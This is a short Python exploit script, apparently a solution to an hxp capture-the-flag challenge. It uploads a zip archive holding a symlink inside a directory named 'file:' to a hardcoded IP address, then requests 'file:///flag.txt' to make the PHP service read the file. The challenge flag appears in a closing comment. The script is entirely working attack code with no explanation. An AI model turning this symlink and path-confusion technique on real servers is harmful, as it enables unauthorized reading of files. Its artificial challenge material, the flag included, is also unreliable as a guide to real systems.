#!/usr/bin/env python3

import requests
import os

url = "http://65.108.176.76:8200"

s = requests.Session()

os.system("mkdir file: && cd file: && touch a.txt && ln -s a.txt flag.txt")
os.system("zip -ry file_flag.zip file:")

files = {'file':open('file_flag.zip','rb')}

r = s.post(url, files=files)

params = {
    "file": "file:///flag.txt"
}

r = s.get(url, params=params)
print(r.text)

# hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}